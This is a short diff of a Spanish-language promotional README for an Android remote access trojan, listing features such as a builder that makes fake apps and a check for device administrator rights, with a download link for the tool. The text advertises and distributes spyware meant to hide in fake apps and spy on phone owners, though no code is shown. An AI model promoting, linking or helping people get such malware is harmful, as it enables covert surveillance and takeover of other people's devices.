@@ -16,7 +16,8 @@ DESCARGARDE DE:https://nibiruanuna.wixsite.com/android-rat-spy
 
 ⭐️El constructor agrega mas opciones de aplicaciones falsas
 
-⭐️Mostrar si el dispositivo es administrador 68747470733a2f2f692e696d6775722e636f6d2f4f69554f55326e2e6a7067 Disponible para rata: https://nibiruanuna.wixsite.com/android-rat-sp
+⭐️Mostrar si el dispositivo es administrador 68747470733a2f2f692e696d6775722e636f6d2f4f69554f55326e2e6a7067
+DESCARGAR :https://nibiruanuna.wixsite.com/android-rat-spy
 
 
 
